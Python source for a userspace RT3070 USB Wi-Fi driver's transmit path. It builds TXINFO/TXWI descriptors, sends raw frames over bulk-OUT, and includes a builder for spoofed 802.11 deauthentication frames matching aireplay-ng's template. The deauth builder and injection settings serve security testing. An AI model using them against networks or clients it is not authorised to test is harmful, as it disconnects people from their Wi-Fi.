"""TX path for the RT3070: build TXINFO + TXWI + bulk-OUT (WIRE ONLY).

Ported from ``rt2800usb_write_tx_desc`` (rt2800usb.c:401-451) + ``rt2800_write_tx_data``
(rt2800lib.c:795-853). The descriptor is built and the bulk-OUT path is wired, but this
driver NEVER fires a frame on its own — injection/deauth is the user's explicit action
[[passive_by_default]]. Bulk-OUT is chip-bound and out of the control gate, so the
descriptor is verified against the kernel + the family wire-format scars, not by
``verify_pcap``.

Wire layout (``rt2800usb_get_tx_data_len`` :440-451):

    | TXINFO(4) | TXWI(16) | 802.11 frame | 4-byte align pad | USB end pad(4) |
                |<------------- USB_DMA_TX_PKT_LEN ---------->|

Family scars honored (re-derived; see chips/rt2800usb/RT2800USB.md §TX): the trailing
+4 USB end pad is mandatory (the chip silently drops bulk-OUT without it); ``QSEL=2``
(EDCA — the only QSEL the data path accepts); ``TX_OP=HT_NONE`` so the chip skips the
RTS/CTS handshake that otherwise eats a spoofed-source mgmt frame; ``WIV=1`` + zeroed
IV words so the inject isn't WEP-encrypted with a zero IV.
"""
from __future__ import annotations

import logging
import struct

import usb.core

from wifit3.chips import log_trace

from . import constants as C
from .constants import set_field

logger = logging.getLogger(__name__)

BROADCAST_MAC = b"\xff" * 6
DEAUTH_REASON_CLASS3 = 7
# 802.11 duration/ID (NAV) aireplay-ng stamps into its deauth template — matched against
# capture-1's bulk-OUT (every wire deauth carried dur=0x013a). The sequence number is
# stamped per-frame by the injector (driver.inject_frame), not here.
DEAUTH_DURATION = 0x013A


def build_mgmt_txdesc(frame_len: int, *, use_no_ack: bool = True, mcs: int = 0,
                      phymode: int = C.RATE_MODE_CCK) -> bytes:
    """TXINFO + TXWI prefix for a management frame [SRC rt2800usb.c:401-435,
    rt2800lib.c:795-853]. Returns ``TXINFO_DESC_SIZE + TXWI_DESC_SIZE_4WORDS`` bytes."""
    aligned = (frame_len + 3) & ~3
    pkt_len = C.TXWI_DESC_SIZE_4WORDS + aligned        # TXWI + frame + pad; NOT TXINFO

    txinfo_w0 = 0
    txinfo_w0 = set_field(txinfo_w0, C.TXINFO_W0_USB_DMA_TX_PKT_LEN, pkt_len)
    txinfo_w0 = set_field(txinfo_w0, C.TXINFO_W0_WIV, 1)        # use descriptor IV (zeros)
    txinfo_w0 = set_field(txinfo_w0, C.TXINFO_W0_QSEL, C.QSEL_EDCA)

    txwi_w0 = 0
    txwi_w0 = set_field(txwi_w0, C.TXWI_W0_MCS, mcs)
    txwi_w0 = set_field(txwi_w0, C.TXWI_W0_PHYMODE, phymode)
    txwi_w0 = set_field(txwi_w0, C.TXWI_W0_TX_OP, C.TXWI_TX_OP_HT_NONE)

    txwi_w1 = 0
    txwi_w1 = set_field(txwi_w1, C.TXWI_W1_ACK, 0 if use_no_ack else 1)
    txwi_w1 = set_field(txwi_w1, C.TXWI_W1_NSEQ, 0)            # use the frame's seqctl
    txwi_w1 = set_field(txwi_w1, C.TXWI_W1_WIRELESS_CLI_ID, 0)  # broadcast / unassociated
    txwi_w1 = set_field(txwi_w1, C.TXWI_W1_MPDU_TOTAL_BYTE_COUNT, frame_len)
    txwi_w1 = set_field(txwi_w1, C.TXWI_W1_PACKETID_QUEUE, 0)
    txwi_w1 = set_field(txwi_w1, C.TXWI_W1_PACKETID_ENTRY, 2)

    # TXWI W2/W3 are IV/EIV — zeroed (no HW crypto on an inject).
    return struct.pack("<5I", txinfo_w0, txwi_w0, txwi_w1, 0, 0)


def build_frame(frame: bytes, *, use_no_ack: bool = True) -> bytes:
    """Full bulk-OUT payload: ``[TXINFO|TXWI|frame|align pad|USB end pad]``.

    ``frame`` is the MPDU without FCS (the chip appends it). The +4 USB end pad is
    mandatory [SRC rt2800usb.c:440-451 ``roundup(skb_len, 4) + 4``]."""
    if not frame:
        raise ValueError("frame is empty")
    if len(frame) > 0x0FFF:
        raise ValueError(f"frame too long for TXWI MPDU field ({len(frame)} > 4095)")
    prefix = build_mgmt_txdesc(len(frame), use_no_ack=use_no_ack)
    pad = (-len(frame)) & 3
    return prefix + frame + b"\x00" * pad + b"\x00\x00\x00\x00"


def send_frame(dev: usb.core.Device, ep: int, frame: bytes, *, use_no_ack: bool = True,
               timeout_ms: int = 1000) -> int:
    """Build + bulk-OUT one frame on ``ep``. The driver gates this behind an explicit
    user action — nothing on the scan/connect path calls it [[passive_by_default]]."""
    payload = build_frame(frame, use_no_ack=use_no_ack)
    if logger.isEnabledFor(log_trace.TRACE):
        logger.trace("bulk-OUT EP 0x%02x (%dB): %s", ep, len(payload), payload.hex())
    return dev.write(ep, payload, timeout_ms)


def build_deauth(target_mac: bytes, bssid: bytes, *, src_mac: bytes | None = None,
                 reason: int = DEAUTH_REASON_CLASS3) -> bytes:
    """A 26-byte 802.11 deauth MPDU (no FCS), byte-matching aireplay-ng's template:
    FC=0xC000, duration=0x013a, addr1=target / addr2=src / addr3=bssid, seqctl=0 (the
    injector stamps the running sequence number), reason. Verified against capture-1."""
    if len(target_mac) != 6 or len(bssid) != 6:
        raise ValueError("MAC addresses must be 6 bytes")
    src_mac = bssid if src_mac is None else src_mac
    if len(src_mac) != 6:
        raise ValueError("src_mac must be 6 bytes")
    return (bytes([0xC0, 0x00]) + struct.pack("<H", DEAUTH_DURATION)
            + target_mac + src_mac + bssid + bytes([0x00, 0x00]) + struct.pack("<H", reason))
